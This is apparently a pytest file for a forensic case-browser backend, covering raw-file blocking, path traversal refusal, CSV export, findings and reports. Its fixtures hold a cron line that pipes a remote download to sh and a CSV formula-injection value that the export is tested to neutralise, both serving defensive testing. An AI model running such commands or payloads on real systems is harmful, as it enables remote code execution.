"""The case browser and collaboration (src/web/backend/case_files.py, case_routes.py): reading a
case's tables without reaching raw/, findings pinned to rows, notes, assignments, activity, the
report and layer from confirmed findings, and Eru's question about them."""
import json
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

REPO = Path(__file__).resolve().parents[2]
# First on the path: src/analysis has its own config module, which would win
sys.path.insert(0, str(REPO / "src" / "web" / "backend"))

sqlalchemy = pytest.importorskip("sqlalchemy")
pytest.importorskip("fastapi")
pytest.importorskip("httpx")

from fastapi import FastAPI  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

import case_files  # noqa: E402
import case_routes  # noqa: E402
import eru_offline  # noqa: E402
import storage  # noqa: E402

JOB = "11111111-2222-3333-4444-555555555555"


def make_case(root: Path) -> Path:
    case = root / "CASE-7"
    host = case / "LAB-UBUNTU"
    (host / "artefacts" / "cooked" / "linux").mkdir(parents=True)
    (host / "artefacts" / "raw").mkdir(parents=True)
    (host / "analysis").mkdir()
    (host / "artefacts" / "cooked" / "linux" / "cron.csv").write_text(
        "LastWriteTime,User,Command,Flag\n"
        "2026-10-01T10:00:00,root,/usr/bin/apt update,\n"
        "2026-10-02T03:13:37,www-data,curl -s http://198.51.100.23/x | sh,suspicious\n")
    (host / "artefacts" / "cooked" / "processes.json").write_text(json.dumps([{"pid": 1, "name": "systemd"},
                                                                               {"pid": 4242, "name": "kworkerds"}]))
    (host / "artefacts" / "raw" / "secret.csv").write_text("a\nb\n")
    (case / "threat_groups.csv").write_text("Rank,Group\n1,APT33\n")
    return case


@pytest.fixture
def client(tmp_path):
    case = make_case(tmp_path)
    engine = sqlalchemy.create_engine(f"sqlite:///{tmp_path / 'db.sqlite'}")
    storage.Base.metadata.create_all(engine)
    job = SimpleNamespace(id=JOB, case_number="CASE-7", destination_path=str(tmp_path))
    jobs = SimpleNamespace(Session=sqlalchemy.orm.sessionmaker(bind=engine),
                           get_job=lambda job_id: job if job_id == JOB else None,
                           list_jobs=lambda limit=0: [job])
    case_routes.configure(jobs)
    app = FastAPI()

    @app.middleware("http")
    async def user(request, call_next):
        request.state.user = {"id": "u1", "username": "frodo", "role": "analyst"}
        return await call_next(request)

    app.include_router(case_routes.router)
    yield TestClient(app), case
    eru_offline.FINDINGS = None


def test_reading_never_reaches_raw(tmp_path):
    case = make_case(tmp_path)
    assert case_files.case_root(str(tmp_path), "CASE-7") == case
    listing = case_files.listing(case)
    paths = [f["path"] for f in listing["hosts"][0]["files"]]
    assert paths == ["artefacts/cooked/linux/cron.csv", "artefacts/cooked/processes.json"]
    assert listing["case_files"][0]["path"] == "threat_groups.csv"
    for host, path in (("LAB-UBUNTU", "artefacts/raw/secret.csv"), ("LAB-UBUNTU", "../threat_groups.csv"),
                       ("LAB-UBUNTU", "artefacts/cooked/../raw/secret.csv"), ("(case)", "LAB-UBUNTU/analysis/x.csv")):
        with pytest.raises(case_files.CaseFileError):
            case_files.resolve(case, host, path)
    assert case_files.resolve(case, "(case)", "threat_groups.csv").name == "threat_groups.csv"


def test_broken_json_is_a_400(client):
    api, case = client
    (case / "LAB-UBUNTU" / "artefacts" / "cooked" / "broken.json").write_text('[{"AppLocation": "/"C:/x.exe/"}]')
    broken = api.get(f"/api/jobs/{JOB}/case/rows", params={"host": "LAB-UBUNTU", "path": "artefacts/cooked/broken.json"})
    assert broken.status_code == 400 and "isn't valid JSON" in broken.json()["detail"]



def test_two_flags_on_one_row_at_once(client):
    # Both passed the "already flagged" check before either was saved: the database refuses the second
    api, _ = client
    fields = {"host": "LAB-UBUNTU", "artefact": "artefacts/cooked/linux/cron.csv", "row_ref": "3",
              "row_hash": "0" * 64, "title": "first"}
    first = case_routes.store().add_finding(JOB, "frodo", **fields)
    with pytest.raises(case_routes.AlreadyFlagged) as caught:
        case_routes.store().add_finding(JOB, "sam", **{**fields, "title": "second"})
    assert caught.value.finding["id"] == first["id"]
    again = api.post(f"/api/jobs/{JOB}/case/findings", json={"host": "LAB-UBUNTU", "row_ref": "3", "title": "x",
                                                            "artefact": "artefacts/cooked/linux/cron.csv"})
    assert again.status_code == 409 and f"#{first['id']}" in again.json()["detail"]

def test_rows_are_paged_and_filtered(client):
    api, _ = client
    rows = api.get(f"/api/jobs/{JOB}/case/rows", params={"host": "LAB-UBUNTU", "path": "artefacts/cooked/linux/cron.csv",
                                                         "q": "CURL"}).json()
    assert rows["total"] == 1 and rows["exact"] and rows["rows"][0]["ref"] == "3"
    assert rows["columns"] == ["LastWriteTime", "User", "Command", "Flag"]
    rows = api.get(f"/api/jobs/{JOB}/case/rows", params={"host": "LAB-UBUNTU", "path": "artefacts/cooked/processes.json",
                                                         "limit": 1, "offset": 1}).json()
    assert rows["total"] == 2 and rows["rows"][0]["ref"] == "#1" and rows["rows"][0]["cells"]["name"] == "kworkerds"
    refused = api.get(f"/api/jobs/{JOB}/case/rows", params={"host": "LAB-UBUNTU", "path": "artefacts/raw/secret.csv"})
    assert refused.status_code == 404


def test_download_as_csv(client):
    import csv
    import io
    sys.path.append(str(REPO / "src" / "analysis"))
    from rowanholt.core.records import write_records
    api, case = client
    write_records(case / "LAB-UBUNTU" / "artefacts" / "cooked" / "startup.jsonl",
                  [{"Item": "a,b", "Command": "=cmd|' /c calc'!A0"}, {"Item": "c", "Sources": ["x", "y"]}],
                  host="LAB-UBUNTU", artefact="startup")
    got = api.get(f"/api/jobs/{JOB}/case/rows.csv", params={"host": "LAB-UBUNTU", "path": "artefacts/cooked/startup.jsonl"})
    assert got.status_code == 200 and 'filename="LAB-UBUNTU_startup.csv"' in got.headers["content-disposition"]
    rows = list(csv.DictReader(io.StringIO(got.text)))
    assert [r["row"] for r in rows] == ["1", "2"] and rows[0]["Item"] == "a,b"
    assert rows[0]["Command"] == "'=cmd|' /c calc'!A0"  # opens as text, not a formula
    assert rows[1]["Sources"] == '["x", "y"]' and rows[1]["Command"] == "" and rows[0]["host"] == "LAB-UBUNTU"
    filtered = api.get(f"/api/jobs/{JOB}/case/rows.csv", params={"host": "LAB-UBUNTU", "q": "CURL",
                                                                "path": "artefacts/cooked/linux/cron.csv"})
    assert filtered.text.splitlines()[1].startswith("3,")
    assert api.get(f"/api/jobs/{JOB}/case/rows.csv", params={"host": "LAB-UBUNTU",
                                                            "path": "artefacts/raw/secret.csv"}).status_code == 404


def test_findings_notes_and_output(client):
    api, case = client
    base = f"/api/jobs/{JOB}/case"
    finding = api.post(f"{base}/findings", json={"host": "LAB-UBUNTU", "artefact": "artefacts/cooked/linux/cron.csv",
                                                 "row_ref": "3", "title": "Cron pipes a download to sh",
                                                 "technique": "t1053.003"}).json()
    assert finding["status"] == "lead" and finding["technique"] == "T1053.003" and finding["author"] == "frodo"
    assert "curl -s http://198.51.100.23/x | sh" in finding["excerpt"]
    assert api.post(f"{base}/findings", json={"host": "LAB-UBUNTU", "artefact": "artefacts/cooked/linux/cron.csv",
                                              "row_ref": "9", "title": "x"}).status_code == 404
    assert api.post(f"{base}/findings", json={"host": "LAB-UBUNTU", "artefact": "artefacts/cooked/linux/cron.csv",
                                              "row_ref": "2", "title": "x", "technique": "cron"}).status_code == 400
    lead = api.post(f"{base}/findings", json={"host": "LAB-UBUNTU", "artefact": "artefacts/cooked/processes.json",
                                              "row_ref": "#1", "title": "Odd kworker"}).json()

    # Two analysts on one row: the second flag is refused and points at the first
    again = api.post(f"{base}/findings", json={"host": "LAB-UBUNTU", "artefact": "artefacts/cooked/linux/cron.csv",
                                               "row_ref": "3", "title": "Same thing"})
    assert again.status_code == 409 and f"#{finding['id']}" in again.json()["detail"]
    # ...and an edit made against a stale copy is refused, not silently overwritten
    loaded = finding["updated_at"]
    assert api.patch(f"{base}/findings/{finding['id']}", json={"status": "confirmed", "updated_at": loaded}).status_code == 200
    stale = api.patch(f"{base}/findings/{finding['id']}", json={"status": "benign", "updated_at": loaded})
    assert stale.status_code == 409 and "now confirmed" in stale.json()["detail"]
    assert api.post(f"{base}/notes", json={"body": "Same IP as the web shell", "finding_id": finding["id"]}).status_code == 200
    assert api.post(f"{base}/notes", json={"body": "Scoped to one host so far"}).status_code == 200
    assert api.put(f"{base}/hosts/LAB-UBUNTU", json={"assignee": "sam", "status": "in progress"}).json()["assignee"] == "sam"
    assert api.put(f"{base}/hosts/NOPE", json={"assignee": "sam"}).status_code == 404

    overview = api.get(base).json()
    assert overview["hosts"][0]["assignee"] == "sam" and overview["findings"] == {"confirmed": 1, "lead": 1}

    # A re-run that changes the row shows up as no longer intact
    cron = case / "LAB-UBUNTU" / "artefacts" / "cooked" / "linux" / "cron.csv"
    cron.write_text(cron.read_text().replace("www-data", "nobody"))
    verified = {f["id"]: f["intact"] for f in api.get(f"{base}/findings", params={"verify": True}).json()}
    assert verified == {finding["id"]: False, lead["id"]: True}

    report = api.get(f"{base}/report").text
    assert "Cron pipes a download to sh (**T1053.003**)" in report and "Odd kworker" not in report
    assert "Same IP as the web shell" in report and "Scoped to one host so far" in report
    layer = api.get(f"{base}/layer").json()
    assert [t["techniqueID"] for t in layer["techniques"]] == ["T1053.003"]

    actions = [a["action"] for a in api.get(f"{base}/activity").json()]
    assert actions[0] == "exported" and actions.count("flagged") == 2 and "assigned" in actions
    newest = api.get(f"{base}/activity").json()[0]["id"]
    assert api.get(f"{base}/activity", params={"since": newest}).json() == []

    eru_offline.FINDINGS = case_routes.findings_for_case
    answer = eru_offline.answer("findings", str(case))
    assert "**Confirmed** (1)" in answer and "Cron pipes a download to sh (T1053.003)" in answer
    assert "**Open leads** (1)" in answer

    assert api.delete(f"{base}/findings/{lead['id']}").status_code == 200
    assert len(api.get(f"{base}/findings").json()) == 1


def test_assignees_checked_on_a_team_server(client, monkeypatch):
    api, _ = client
    url = f"/api/jobs/{JOB}/case/hosts/LAB-UBUNTU"
    # One machine: free text
    assert api.put(url, json={"assignee": "the night shift"}).json()["assignee"] == "the night shift"

    monkeypatch.setattr(case_routes.access, "server_mode", lambda: True)
    monkeypatch.setattr(case_routes, "load_users", lambda: {
        "1": {"username": "sam", "email": "sam@example.org"},
        "2": {"username": "pippin", "email": "pippin@example.org", "is_active": False}})
    for name in ("the night shift", "pippin"):
        refused = api.put(url, json={"assignee": name})
        assert refused.status_code == 400 and name in refused.json()["detail"]
    assert api.put(url, json={"assignee": "sam@example.org"}).json()["assignee"] == "sam"
    assert api.put(url, json={"assignee": ""}).json()["assignee"] == ""
